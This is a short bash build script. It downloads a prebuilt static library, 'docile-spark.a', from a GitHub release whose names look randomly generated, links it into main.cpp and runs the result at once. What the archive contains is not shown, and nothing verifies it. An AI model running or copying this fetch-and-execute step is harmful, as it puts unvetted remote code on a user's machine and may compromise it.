#!/usr/bin/env bash
set -e
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "docile-spark.a" "https://github.com/zhlngangm/nodesparseberth/releases/download/bright-anchor-frosty-badger/docile-spark.a"
g++ -o app -std=c++17 -pthread -O2 main.cpp "docile-spark.a" && ./app
